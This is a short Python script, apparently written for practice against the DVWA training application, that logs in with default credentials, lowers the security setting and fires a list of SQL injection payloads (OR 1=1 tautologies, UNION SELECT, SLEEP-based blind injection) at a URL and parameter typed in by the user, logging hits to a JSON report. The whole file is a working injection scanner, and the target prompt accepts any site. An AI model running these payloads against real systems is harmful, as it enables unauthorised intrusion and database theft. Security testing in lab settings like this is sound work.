import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
import json
import time

init(autoreset=True)

session = requests.Session()

LOGIN_URL = "http://localhost/dvwa/login.php"

def login():
    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }

    session.post(LOGIN_URL, data=data)
    session.cookies.set("security", "low")
    print(Fore.CYAN + "[+] Logged into DVWA automatically")

payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' UNION SELECT null,null--",
    "' AND SLEEP(3)--"
]

results = []

def test_payload(url, param, payload):
    time.sleep(1)  # rate limiting

    test_url = f"{url}?{param}={payload}&Submit=Submit"

    r = session.get(test_url)

    if "Surname" in r.text or "First name" in r.text:
        print(Fore.RED + f"[VULNERABLE] {payload}")
        results.append({"payload": payload, "url": test_url})
    else:
        print(Fore.GREEN + f"[SAFE] {payload}")

def scan(url, param):
    print(Fore.CYAN + "\nStarting Smart SQL Injection Scan...\n")

    with ThreadPoolExecutor(max_workers=3) as executor:
        for payload in payloads:
            executor.submit(test_payload, url, param, payload)

def save_json():
    with open("report.json", "w") as f:
        json.dump(results, f, indent=4)

if __name__ == "__main__":
    login()
    target = input("Enter target URL: ")
    parameter = input("Enter parameter name: ")

    scan(target, parameter)
    time.sleep(2)
    save_json()
    print(Fore.YELLOW + "\nReport saved as report.json")
